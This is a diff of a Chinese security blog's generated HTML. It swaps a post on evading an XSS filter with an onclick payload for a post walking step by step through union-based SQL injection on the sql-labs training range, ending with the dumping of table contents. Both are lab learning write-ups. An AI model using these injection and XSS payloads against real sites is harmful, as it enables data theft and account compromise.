@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="（四）跨站脚本XSS之逃逸过滤, Wkai">
+    <meta name="keywords" content="（三）SQL注入—联合注入实操, Wkai">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>（四）跨站脚本XSS之逃逸过滤 | Wkai</title>
+    <title>（三）SQL注入—联合注入实操 | Wkai</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -201,12 +201,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(4).png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(5).png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">（四）跨站脚本XSS之逃逸过滤</h1>
+                    <h1 class="description center-align post-title">（三）SQL注入—联合注入实操</h1>
                 </div>
             </div>
         </div>
@@ -321,13 +321,9 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/xss/">
-                                <span class="chip bg-color">xss</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
@@ -335,8 +331,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/XSS/" class="post-category">
-                                XSS
+                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
+                                SQL注入
                             </a>
                         
                     </div>
@@ -348,7 +344,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-07-28
+                    2020-08-18
                 </div>
                 
 
@@ -365,59 +361,137 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <ul>
-<li>当我们学会了打破网页结构之后，我们发现这个技巧有些情况并不适用。并不能成功的闭合标签，或者像<code>&lt;script&gt;</code>标签直接被过滤。这时候我们应该换一个思路,使用事件属性来突破。</li>
-<li>靶场由<a href="https://zhishihezi.net/box/" target="_blank" rel="noopener">知识盒子</a>提供，本篇靶场地址：<a href="https://tofu.exeye.run/event" target="_blank" rel="noopener">https://tofu.exeye.run/event</a></li>
+<li>在学习了部分联合注入的原理后，还没有真正实操过，所以搭建了个sql-labs的靶场实践下，发现没有实操过果然还是会遗漏许多细节的，本篇主要总结了下联合注入的实操，如何一步一步地从数据库名到列出字段值</li>
+<li>我选择的是靶场sql-labs的第一关，因为比较简单</li>
+<li>为了能够更加清晰地找出问题所在，需要改下靶场源码，让靶场能够有回显</li>
 </ul>
-<br>
+<pre class=" language-php"><code class="language-php">首先找到<span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+在底下加入 <span class="token keyword">echo</span> <span class="token string">"有效输入："</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
+然后找到 <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span><span class="token punctuation">;</span>
+在底下加入 <span class="token keyword">echo</span> <span class="token string">"执行的sql语句"</span><span class="token punctuation">.</span><span class="token string">"$sql"</span><span class="token punctuation">.</span><span class="token string">"&lt;br>"</span><span class="token punctuation">;</span></code></pre>
+<ul>
+<li>加入了之后页面是这样的，拥有输入回显和SQL语句回显</li>
+</ul>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(5).png" alt></p>
+<ul>
+<li>首先我们尝试单引号<code>&#39;</code>报错回显，发现是可以造成SQL语法错误的</li>
+</ul>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(9).png" alt></p>
+<ul>
+<li>然后我们尝试下?id=1’ and 1=1#,然后问题就出来了，#并没有注释掉后面的内容</li>
+</ul>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(6).png" alt></p>
+<ul>
+<li>OK，那<code>#</code>不行，那我们尝试下<code>--</code>，然而很遗憾，依旧是注释不掉后面的内容</li>
+</ul>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(2).png" alt></p>
+<ul>
+<li>后来我看了下别人的方法，才发现很多细节是我没学到的</li>
+<li>比如HTTP请求中不包括<code>#</code></li>
+</ul>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(10).png" alt="通过抓包可以证明请求包中确实不会出现#"></p>
+<ul>
+<li>所以想用到<code>#</code>注释，必须要先将<code>#</code>经过URL编码，<code>#</code>的URL编码是%23</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">23</span>
+这里必须注意<span class="token operator">and</span>两边必须有空格，否则语句将会不成立</code></pre>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(7).png" alt></p>
+<ul>
+<li>然后再说说注释符号<code>--</code>，在使用符号<code>--</code>注释的时候，<code>--</code>后面不能跟单引号<code>&#39;</code>，需要用到一个<code>+</code>分格，<code>+</code>在语句中会变成空格，这就是为什么许多人注入的语句后面是<code>--+</code>的原因。</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token operator">and</span> <span class="token number">1</span><span class="token operator">=</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(13).png" alt></p>
+<ul>
+<li>在踩了这几个坑后就可以开始正式的操作啦</li>
+<li>第一步，利用order by判断字段数量</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token number">1</span>' <span class="token keyword">order</span> <span class="token keyword">by</span> <span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<ul>
+<li><ul>
+<li>在<code>order by</code>还是<code>3</code>的时候，页面还是显示正常的</li>
+</ul>
+</li>
+<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(8).png" alt></p>
+</li>
+<li><ul>
+<li>到<code>4</code>的时候页面就出错了</li>
+</ul>
+</li>
+<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(1).png" alt></p>
+</li>
+<li><ul>
+<li>说明调用的这张表，它只有三个字段</li>
+</ul>
+</li>
+<li><p>第二步，利用联合注入判断显示位置，看看哪个字段可以显示在页面上</p>
+</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token comment" spellcheck="true">--+</span></code></pre>
+<ul>
+<li><ul>
+<li>结果只有2和3才能显示在页面上</li>
+</ul>
+</li>
+<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(12).png" alt></p>
+</li>
+<li><p>第三步，查看数据库信息,将显示位3替换为其他信息的查询</p>
+</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,CONCAT_WS('</span><span class="token operator">|</span>'<span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>@<span class="token variable">@datadir</span><span class="token punctuation">,</span>@<span class="token variable">@version_compile_os</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">--+</span>
 
+这里注意，分割符号两边得加引号</code></pre>
 <ul>
-<li>直接打开页面是一个输入框，右边的按钮会将输入的内容变成一个链接</li>
+<li><ul>
+<li>可以看到显示位3上输出了许多信息</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(2).png" alt></p>
-<ul>
-<li><p>按套路走，先看javascript的源代码，因为输入内容一般会先由js控制</p>
 </li>
-<li><pre class=" language-javascript"><code class="language-javascript"> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-btn'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//定义按钮类url-btn的函数内容</span>
-            <span class="token keyword">let</span> val <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.search-ipt'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">val</span><span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//获取输入框的内容</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                   <span class="token comment" spellcheck="true">//如果为空</span>
-                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span> <span class="token string">'none'</span><span class="token punctuation">)</span>   
-            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//如果不为空</span>
-                val <span class="token operator">=</span>  val<span class="token punctuation">.</span><span class="token function">toLocaleLowerCase</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/script/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/&lt;/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/>/g</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">//这里会过滤掉&lt;>和script</span>
-                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'display'</span><span class="token punctuation">,</span> <span class="token string">'block'</span><span class="token punctuation">)</span>
-                <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.url-box'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">html</span><span class="token punctuation">(</span><span class="token string">'&lt;span style="padding-left: 2px">生成的链接为：&lt;a class="url" href="'</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'">'</span><span class="token operator">+</span>val<span class="token operator">+</span><span class="token string">'&lt;/a>&lt;/span>'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">//将输入的内容变成href的value</span>
-            <span class="token punctuation">}</span>
-        <span class="token punctuation">}</span>
-    <span class="token punctuation">)</span></code></pre>
+<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(11).png" alt></p>
 </li>
-<li><p>分析源代码，我们输入的数据会变成链接，以及标签的内容，但是<code>&lt;script&gt;</code>会被过滤</p>
-</li>
-<li><p>如果只是过滤script这个字眼，那这里有个小技巧，可以在一个script中再插入个script，比如scrscriptipt，系统将script过滤掉后刚好面的字母又可以组成一个script</p>
-</li>
-<li><p>但是偏偏还过滤了&lt;&gt;，所以这就有点难办了，无法打破网页结构</p>
+<li><p>第四步，在已知数据库名为security后，列出所有的表名</p>
 </li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(3).png" alt></p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,table_name from information_schema.tables where table_schema='</span>security' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span></code></pre>
 <ul>
-<li><p>分析源码，我们发现还有个方法，就是构造一个onclick事件让他触发js代码</p>
+<li><ul>
+<li>通过不断变换limit的参数，可以查看不同的表名</li>
+</ul>
 </li>
-<li><p>那么怎么触发呢？</p>
+<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard.png" alt></p>
 </li>
-<li><p>我们同样需要先闭合href字段，再给末尾的引号凑对</p>
-</li>
-<li><p>所以我们的最终payload为：</p>
-</li>
-<li><pre class=" language-javascript"><code class="language-javascript"><span class="token string">"onclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS'</span><span class="token punctuation">)</span></code></pre>
+<li><p>第五步，在已知数据库为security且表名为emails的情况下，查看表的字段</p>
 </li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(4).png" alt="这样就成功构造了一个onclick事件"></p>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span><span class="token string">' union select 1,2,column_name from information_schema.columns where table_schema='</span>security<span class="token string">' and table_name='</span>emails' <span class="token keyword">limit</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment" spellcheck="true">--+</span>
+</code></pre>
 <ul>
-<li>点击链接成功触发弹窗</li>
+<li><ul>
+<li>同样的，变换limit的参数，可以查看不同的字段</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard(1).png" alt></p>
+</li>
+<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(3).png" alt></p>
+</li>
+<li><p>第六步，已知字段值的情况下，查看表emails的字段值</p>
+</li>
+</ul>
+<pre class=" language-sql"><code class="language-sql">?id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span>' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>email_id<span class="token punctuation">)</span> <span class="token keyword">from</span> emails<span class="token comment" spellcheck="true">--+</span></code></pre>
 <ul>
-<li>不过有个需要注意到的地方就是payload括号中不能用双引号，否则就不能凑成一个闭合，也就无法触发弹窗了</li>
+<li><ul>
+<li>通过group_concat可以列出指定字段的所有值，并且排成一行，默认是逗号分格</li>
 </ul>
-<p><img src="/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/clipboard.png" alt></p>
+</li>
+<li><p><img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(4).png" alt></p>
+</li>
+<li><p>总结下</p>
+<ul>
+<li>联合注入的基本步骤为：查找注入点-&gt;查找显示位-&gt;输出数据库信息-&gt;根据数据库名输出表名-&gt;根据数据库名和表名输出字段名-&gt;根据表名和字段名输出字段值</li>
+<li>数据库<code>information_schema</code>中表<code>tables</code>是用来记录所有表名的，而表<code>columns</code>是用来记录所有字段名的</li>
+<li>请求包不会出现<code>#</code>号，只能经过URL编码</li>
+<li>用–注释，如果后面有单引号，注释是不会生效的，需要插入<code>+</code>号，<code>+</code>会自动转换成空格，所以最好地注释就是<code>--+</code></li>
+<li>SQL语句对空格挺敏感的，一旦该加空格的地方没加空格，语句就会不成立</li>
+<li>在使用CONCAT_WS()的时候，分隔符号两边必须加引号</li>
+</ul>
+</li>
+</ul>
 
             </div>
             <hr/>
@@ -443,7 +517,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://wkaiblog.cn/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/">http://wkaiblog.cn/2020/07/28/%EF%BC%88%E5%9B%9B%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%80%83%E9%80%B8%E8%BF%87%E6%BB%A4/</a>
+                    <a href="http://wkaiblog.cn/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/">http://wkaiblog.cn/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -480,11 +554,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/xss/">
-                                    <span class="chip bg-color">xss</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -650,49 +720,44 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/">
+                <a href="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/28/%EF%BC%88%E4%BA%94%EF%BC%89%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACXSS%E4%B9%8B%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6/clipboard(2).png" class="responsive-img" alt="（五）跨站脚本XSS之长度限制">
+                        <img src="/2020/08/18/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%AE%9E%E6%93%8D/clipboard(5).png" class="responsive-img" alt="（三）SQL注入—联合注入实操">
                         
-                        <span class="card-title">（五）跨站脚本XSS之长度限制</span>
+                        <span class="card-title">（三）SQL注入—联合注入实操</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-我们平时测试总会用alert(1)去测试是否存在xss漏洞，但真到了要利用这个漏洞。执行的代码就不是alert(1)这么简单了，一些输入点具有字符长度的限制，可能测试语句alert(1)可以顺利执行，但真正的利用代码就会很长，导致无法顺利
+在学习了部分联合注入的原理后，还没有真正实操过，所以搭建了个sql-labs的靶场实践下，发现没有实操过果然还是会遗漏许多细节的，本篇主要总结了下联合注入的实操，如何一步一步地从数据库名到列出字段值
+我选择的是靶场sql-labs的第一关
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-07-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-18
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/XSS/" class="post-category">
-                                    XSS
+                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
+                                    SQL注入
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/xss/">
-                        <span class="chip bg-color">xss</span>
-                    </a>
-                    
-                </div>
+
                 
             </div>
         </div>
@@ -703,49 +768,43 @@
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/">
+                <a href="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/">
                     <div class="card-image">
                         
-                        <img src="/2020/07/22/%E8%A7%A3%E5%86%B3%E6%96%B0%E7%89%88Kali%E6%A1%A5%E6%8E%A5%E5%92%8CNAT%E6%97%A0%E6%B3%95%E5%85%B1%E5%AD%98%E7%9A%84%E9%97%AE%E9%A2%98/clipboard(4).png" class="responsive-img" alt="解决新版Kali桥接和NAT无法共存的问题">
+                        <img src="/2020/08/17/%EF%BC%88%E4%B8%89%EF%BC%89SQL%E6%B3%A8%E5%85%A5%E2%80%94%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86/clipboard(3).png" class="responsive-img" alt="（三）SQL注入—联合注入原理">
                         
-                        <span class="card-title">解决新版Kali桥接和NAT无法共存的问题</span>
+                        <span class="card-title">（三）SQL注入—联合注入原理</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
                             
-最近在安装了配备XFCE桌面的新版KALI后，突然发现添加的一张桥接的网卡，不能和NAT网卡同时使用，两张网卡只允许一张获取IP地址
+本篇主要总结了下联合注入的原理，并且结合数据库证明这些原理，联合注入主要是靠union实现，union的功能是将右边的查询结果和左边的查询结果合并，所以大部分操作都是通过union实现的。
+首先列出测试用的表结构和数据
 
 
 
-后来发现，可能是虚拟机添加了这张网卡，但是KALI本身没有办法启用它。
-于是我找到了高级网络编辑器
+
+
+在参数后
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-07-22
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-17
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E8%99%9A%E6%8B%9F%E6%9C%BA/" class="post-category">
-                                    虚拟机
+                            <a href="/categories/SQL%E6%B3%A8%E5%85%A5/" class="post-category">
+                                    SQL注入
                                 </a>
                             
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/KALI/">
-                        <span class="chip bg-color">KALI</span>
-                    </a>
-                    
                 </div>
                 
             </div>
